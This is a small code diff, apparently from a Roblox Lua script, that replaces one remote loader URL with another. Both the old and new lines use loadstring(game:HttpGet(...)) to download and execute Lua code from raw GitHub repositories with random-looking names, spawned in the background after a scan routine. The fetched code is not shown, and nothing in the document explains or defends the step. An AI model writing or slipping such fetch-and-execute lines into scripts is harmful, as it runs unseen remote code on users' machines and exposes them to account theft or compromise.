@@ -723,7 +723,7 @@ end
 scanAndNotify()
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/Vhposhpohosh0p.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/ghjnfthun/refs/heads/main/WWW2.lua"))()
 end)
 
 while true do
